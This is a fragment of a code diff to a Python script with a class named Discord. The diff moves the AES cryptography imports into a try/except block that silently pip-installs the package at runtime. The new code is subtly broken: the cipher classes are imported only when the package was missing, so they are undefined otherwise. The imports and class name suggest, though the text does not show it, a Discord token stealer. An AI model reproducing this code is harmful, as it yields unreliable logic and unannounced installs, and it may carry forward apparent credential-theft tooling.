@@ -4,8 +4,17 @@ import json
 import base64
 import requests
 from datetime import datetime, timezone
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
+
+def install(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+try:
+    import cryptography
+except ImportError:
+    install('cryptography')
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    from cryptography.hazmat.backends import default_backend
+time.sleep(1)
+
 from pathlib import Path
 
 class Discord:
